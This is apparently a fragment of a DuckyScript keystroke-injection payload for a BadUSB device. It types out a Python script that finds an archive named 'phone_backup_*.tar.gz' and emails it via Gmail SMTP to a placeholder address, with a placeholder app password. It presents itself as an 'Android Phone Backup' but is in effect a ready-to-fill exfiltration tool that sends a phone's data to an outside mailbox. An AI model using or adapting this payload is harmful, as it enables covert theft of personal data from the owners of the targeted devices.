REM Create Python script to email data

DELAY 500

STRING import smtplib
ENTER
STRING from email.mime.multipart import MIMEMultipart
ENTER
STRING from email.mime.base import MIMEBase
ENTER
STRING from email.mime.text import MIMEText
ENTER
STRING from email import encoders
ENTER
STRING import glob
ENTER
STRING import os
ENTER
DELAY 500

STRING sender = "YOUR_GMAIL@gmail.com"
ENTER
STRING receiver = "YOUR_GMAIL@gmail.com"
ENTER
STRING password = "YOUR_APP_PASSWORD"
ENTER
DELAY 500

STRING msg = MIMEMultipart()
ENTER
STRING msg['From'] = sender
ENTER
STRING msg['To'] = receiver
ENTER
STRING msg['Subject'] = "Android Phone Backup - " + os.popen('date').read().strip()
ENTER
DELAY 500

STRING body = "Automated phone backup attached"
ENTER
STRING msg.attach(MIMEText(body, 'plain'))
ENTER
DELAY 500

STRING files = glob.glob("phone_backup_*.tar.gz")
ENTER
STRING if files:
ENTER
STRING     filename = files[0]
ENTER
STRING     with open(filename, 'rb') as f:
ENTER
STRING         part = MIMEBase('application', 'octet-stream')
ENTER
STRING         part.set_payload(f.read())
ENTER
STRING         encoders.encode_base64(part)
ENTER
STRING         part.add_header('Content-Disposition', f'attachment; filename={filename}')
ENTER
STRING         msg.attach(part)
ENTER
DELAY 500

STRING server = smtplib.SMTP('smtp.gmail.com', 587)
ENTER
STRING server.starttls()
ENTER
STRING server.login(sender, password)
ENTER
STRING server.send_message(msg)
ENTER
STRING server.quit()
ENTER
STRING print("Email sent successfully!")
ENTER
STRING EOFPYTHON
ENTER
DELAY 1000
